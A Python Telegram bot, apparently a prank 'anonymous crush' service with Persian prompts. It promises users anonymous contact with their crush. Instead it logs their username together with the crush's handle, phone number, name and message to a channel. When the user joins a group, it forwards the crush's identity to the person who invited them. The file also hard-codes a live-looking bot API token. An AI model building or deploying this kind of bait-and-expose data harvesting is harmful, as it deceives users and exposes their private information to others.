# -*- coding: utf-8 -*-

from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, RegexHandler,ConversationHandler
import logging
import re
from pymongo import MongoClient
#enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)
TOKEN = "438990241:AAFUj4PNrfbEg2fNVtgwan81UiUhXF95wQc"
#database part
client = MongoClient() #connecting to database
db = client["crush"] #using database
users = db["users"] #selecting usersection
group_members = db["members"]

def new_user(update,inviter=""):
    crushes =  ""
    inviter = "".join(inviter)
    inviter_user = users.find_one({"username":inviter})
    if inviter_user  is not None:
        new_num_invite = inviter_user["num_invite"] 
        new_num_invite += 1
        users.update_one({"username":inviter},{"$set":{"num_invite":new_num_invite}})
    this_user = users.find_one({"username":update.message.from_user.username})
    crush = ""
    if re.match("^@.+$",update.message.text):
        crush = update.message.text
    else:
        crush=""
    if  this_user is None:
        if crush  != "":
            crushes = crush
        users.update_one({"username":update.message.from_user.username,"chat_id":update.message.chat.id,"inviter":inviter,"num_invite":0},{"$set":{"crushes":crushes,"allow":True}},upsert=True)
    else:
        new_crushes = this_user["crushes"]
        if crush != "":
            if crush != new_crushes:
                new_crushes = crush
        users.update_one({"username":update.message.from_user.username},{"$set":{"crushes":new_crushes,"allow":True}},upsert=True)
def count(bot):
    bot.send_message(chat_id="@crushbotlog",text="We have {} users in bot and we have {} group members.".format(users.count(),group_members.count()))
def start(bot,update,args):
    print(update)
    new_user(update,args)
    reply_keyboard = [["آیدی","موبایل"],["نه شمارش رو دارم نه آیدی"],["بررسی عضویت"],["عضویت در گروه"]]
    update.message.reply_text("به ربات کراش ناشناس خوش اومدی با این ربات میتونی با کراشت به طور ناشناس حرف بزنی کافیه آیدیش یا شماره موبایلش رو به ربات بدی . بقیش با ما"
                                ,reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True))

def _id(bot,update):
    update.message.reply_text("آیدیش رو به این صورت بفرست")
    bot.send_message(chat_id=update.message.chat.id,text="@xxx")
def mobile(bot,update):
    update.message.reply_text("موبایلش رو به این صورت بفرست : +989999999999")
def get_mobile(bot,update):
    count(bot)
    new_user(update)
    bot.send_message(chat_id="@crushbotlog",text="@"+update.message.from_user.username+ "'s crush number is "+update.message.text)
    update.message.reply_text("هرچی میخوای براش بنویس")
def get_id(bot,update):
    new_user(update)
    count(bot)

    bot.send_message(chat_id="@crushbotlog",text="@"+update.message.from_user.username+ "'s crush id is "+update.message.text)
    update.message.reply_text("هرچی میخوای براش بنویس")
def khodet_khasti(bot,update):
    update.message.reply_text("خودت خواستی")
def get_text(bot,update):
    reply_keyboard = [["عضویت در گروه"]]
    this_user = users.find_one({"username":update.message.from_user.username})
    if this_user["allow"] != True:
        update.message.reply_text("هنوز برام آیدی یا شماره موبایل نفرستادی")
    else:
        users.update_one({"username":update.message.from_user.username},{"$set":{"allow":False}},upsert=False)
        bot.send_message(chat_id="@crushbotlog",text="@"+update.message.from_user.username+ "'==> "+update.message.text)
        update.message.reply_text("اگر میخوای جوابشو بشنوی عضو گروه شو \n ",reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True))
def badbakht(bot,update):
    count(bot)
    new_user(update)
    bot.send_message(chat_id="@crushbotlog",text="@"+update.message.from_user.username+ "'s crush number is "+update.message.text)
    update.message.reply_text("اسمش رو بگو برات پیداش کنم فقط آخر اسمش یه ستاره بزار")
def verify(bot,update):
    if not check_member(update.message.from_user.username):
        update.message.reply_text("عضو نیستیا \n https://t.me/joinchat/DigUVhIXjl4Og0y9ETuGfQ")
    else:
        update.message.reply_text("عضوی ")
def check_member(username):
    if group_members.find_one({"username":username}) != None:
        return True
    return False
def get_name(bot,update):
    new_user(update)
    count(bot)

    bot.send_message(chat_id="@crushbotlog",text="@"+update.message.from_user.username+ "'s crush name is "+update.message.text)
    update.message.reply_text("هرچی میخوای براش بنویس")


def new_member(bot,update):
    print("new")  
    for u in update.message.new_chat_members:
        user = users.find_one({"username":u.username})
        if user is not None:
            reply_markup = [["ارسال کن مهم نیس"],["نه نه ربات رو برا دوستم میفرستم"]]
            bot.send_message(chat_id=user['chat_id'],text="افرین رسما بدبخت شدی 😁 حالا اسم کراشت و پیامت برا کسی که این لینک رو برات فرستاد ارسال میشه",reply_markup=ReplyKeyboardMarkup(reply_markup, one_time_keyboard=True))
        if group_members.find_one({"username":u.username}) == None:
            group_members.insert_one({"username":u.username})
    count(bot)
def left_member(bot,update):
    print("left")
    if group_members.find_one({"username":update.message.left_chat_member.username}) != None:
        group_members.remove({"username":update.message.left_chat_member.username})
    count(bot)
def test(bot,update):
    print("##$$## OK $$##$$")
def join_gp(bot,update):
    update.message.reply_text("https://t.me/joinchat/DigUVhIXjl4Og0y9ETuGfQ")
def join_bot(bot,update):
    update.message.reply_text("https://t.me/crush3r_bot/?start=@"+update.message.from_user.username)
def send_him(bot,update):
    this_user = users.find_one({"username":update.message.from_user.username})
    inviter = this_user["inviter"]
    this_inviter = users.find_one({"username":inviter})
    bot.send_message(chat_id=this_inviter["chat_id"],text="میدونستی کراش رفیقت کیه ؟")
    bot.send_message(chat_id=this_inviter["chat_id"],text="{}".format(this_user["crushes"]))
# Main function
def main():
    """Start the bot."""

    updater = Updater(TOKEN)

    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start",start,pass_args=True))
    dp.add_handler(CommandHandler("verify",verify))
    dp.add_handler(CommandHandler("test",test))
    dp.add_handler(RegexHandler("^\+989([0-9]{9})$",get_mobile))
    dp.add_handler(RegexHandler("^@.+$",get_id))
    dp.add_handler(RegexHandler("عضویت در گروه",join_gp))
    dp.add_handler(RegexHandler("نه نه نفرست",join_gp))
    dp.add_handler(RegexHandler("نه شمارش رو دارم نه آیدی",badbakht))
    dp.add_handler(RegexHandler("^[^/].*\*$",get_name))
    dp.add_handler(RegexHandler("بررسی عضویت",verify))
    dp.add_handler(RegexHandler("نه نه ربات رو برا دوستم میفرستم",join_bot))
    dp.add_handler(RegexHandler("ارسال کن مهم نیس",khodet_khasti))
    dp.add_handler(RegexHandler("آیدی",_id))
    dp.add_handler(RegexHandler("موبایل",mobile))
    dp.add_handler(RegexHandler("^[^/].*",get_text))
    dp.add_handler(MessageHandler(Filters.status_update.new_chat_members,new_member))
    dp.add_handler(MessageHandler(Filters.status_update.left_chat_member,left_member))

    
    updater.start_polling()

    updater.idle()
if __name__ == '__main__':
    main()